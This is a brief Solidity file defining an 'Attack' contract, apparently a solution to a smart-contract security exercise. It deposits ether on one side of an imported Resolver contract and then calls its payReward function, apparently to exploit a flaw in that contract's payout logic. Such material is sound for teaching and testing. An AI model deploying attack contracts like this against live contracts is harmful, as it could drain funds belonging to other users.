// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./Resolver.sol";

contract Attack {
    Resolver c;

    constructor(Resolver _contractAddress) {
        c = Resolver(_contractAddress);
    }

    function deposit() public payable {
        c.deposit{value: msg.value}(Resolver.Side.A);
    }

    function attack() public {
        c.payReward();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
